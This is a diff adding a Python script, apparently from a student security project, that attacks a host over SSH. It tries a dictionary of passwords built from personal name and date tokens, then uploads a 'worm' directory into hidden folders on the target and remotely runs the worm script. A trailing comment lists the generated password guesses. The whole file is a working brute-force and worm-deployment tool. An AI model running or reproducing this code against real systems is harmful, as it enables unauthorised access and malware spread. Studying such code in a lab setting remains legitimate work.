@@ -1,0 +1,185 @@
+#!/usr/bin/env python3
+import os
+import itertools
+import paramiko
+import time
+import argparse
+
+possible = ['YueHan', 'Wang', 'YH', '1999', '0228', 'oscar', 'Realtek', '@', '_']
+
+#from: stackoverflow.com/questions/4409502/directory-transfers-with-paramiko
+class MySFTPClient(paramiko.SFTPClient):
+    def put_dir(self, source, target):
+        ''' Uploads the contents of the source directory to the target path. The
+            target directory needs to exists. All subdirectories in source are 
+            created under target.
+        '''
+        for item in os.listdir(source):
+            if os.path.isfile(os.path.join(source, item)):
+                self.put(os.path.join(source, item), '%s/%s' % (target, item))
+            else:
+                self.mkdir('%s/%s' % (target, item), ignore_existing=True)
+                self.put_dir(os.path.join(source, item), '%s/%s' % (target, item))
+
+    def mkdir(self, path, mode=511, ignore_existing=False):
+        ''' Augments mkdir by adding an option to not fail if the folder exists  '''
+        try:
+            super(MySFTPClient, self).mkdir(path, mode)
+        except IOError:
+            if ignore_existing:
+                pass
+            else:
+                raise
+
+def get_argments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(dest="IP")
+    options = parser.parse_args()
+    return options
+
+def sftp_upload_file(local_path, server_path, hostIP, passwd):
+    try:
+        t = paramiko.Transport((hostIP, 22))
+        t.connect(username = "attacker", password = passwd)
+        sftp = paramiko.SFTPClient.from_transport(t)
+        sftp.put(local_path, server_path)
+        t.close()
+    except Exception as e:
+        print (e)
+
+def main():
+    res = list(itertools.permutations(possible, 2))
+    # for i in res: 
+    #     print (''.join(i))
+
+    input_cmd = get_argments()
+    ip = input_cmd.IP
+    username = "attacker"
+    #----------ssh directly connent by password--------------
+    # password = "YH0228"
+    #----------ssh directly connent by password--------------
+
+
+
+    #---------------------Dictionary Attack-------------------
+    for pw in res:
+        passwd = str(''.join(pw))
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(hostname = ip, port = 22, username = username, password = passwd)
+        except:
+            print("[Failed]-----the wrong password: " + passwd)
+            time.sleep(5)
+            ssh.close()
+        else:
+            print("[Successed]-----the password: " + passwd)
+            password = passwd
+            ssh.close()
+            break
+    #---------------------Dictionary Attack-------------------
+    
+
+    #---------------------Upload virus------------------------
+    transport = paramiko.Transport((ip, 22))
+    transport.connect(username= "attacker", password = password)
+    sftp = MySFTPClient.from_transport(transport)
+
+    sftp.mkdir('/home/attacker/Documents/.scarecrow', ignore_existing = True)
+    sftp.put_dir('/home/victim/Desktop/Project3/worm', '/home/attacker/Documents/.scarecrow')
+
+    sftp.mkdir('/home/attacker/Desktop/.Backup', ignore_existing = True)
+    sftp.put_dir('/home/victim/Desktop/Project3/worm', '/home/attacker/Desktop/.Backup')
+
+    sftp.close()
+
+
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(hostname = ip, port = 22, username = username, password = password)
+    # stdin, stdout, stderr = ssh.exec_command('g++ -o bk /home/attacker/Desktop/.Backup/backc.cpp')
+    # print(stdout.read().decode())
+    # stdin, stdout, stderr = ssh.exec_command('/home/attacker/Desktop/.Backup/bk')
+    # print(stdout.read().decode())
+    stdin, stdout, stderr = ssh.exec_command('python3 /home/attacker/Documents/.scarecrow/wormm.py')
+    ssh.close()
+    # c_command('crontab -l')
+    # print(stdout.read().decode())
+    
+
+
+if __name__ == '__main__':
+    main()
+#password_map
+# YueHanWang
+# YueHanYH
+# YueHan1999
+# YueHan0228
+# YueHanoscar
+# YueHanRealtek
+# YueHan@
+# YueHan_
+# WangYueHan
+# WangYH
+# Wang1999
+# Wang0228
+# Wangoscar
+# WangRealtek
+# Wang@
+# Wang_
+# YHYueHan
+# YHWang
+# YH1999
+# YH0228
+# YHoscar
+# YHRealtek
+# YH@
+# YH_
+# 1999YueHan
+# 1999Wang
+# 1999YH
+# 19990228
+# 1999oscar
+# 1999Realtek
+# 1999@
+# 1999_
+# 0228YueHan
+# 0228Wang
+# 0228YH
+# 02281999
+# 0228oscar
+# 0228Realtek
+# 0228@
+# 0228_
+# oscarYueHan
+# oscarWang
+# oscarYH
+# oscar1999
+# oscar0228
+# oscarRealtek
+# oscar@
+# oscar_
+# RealtekYueHan
+# RealtekWang
+# RealtekYH
+# Realtek1999
+# Realtek0228
+# Realtekoscar
+# Realtek@
+# Realtek_
+# @YueHan
+# @Wang
+# @YH
+# @1999
+# @0228
+# @oscar
+# @Realtek
+# @_
+# _YueHan
+# _Wang
+# _YH
+# _1999
+# _0228
+# _oscar
+# _Realtek
+# _@
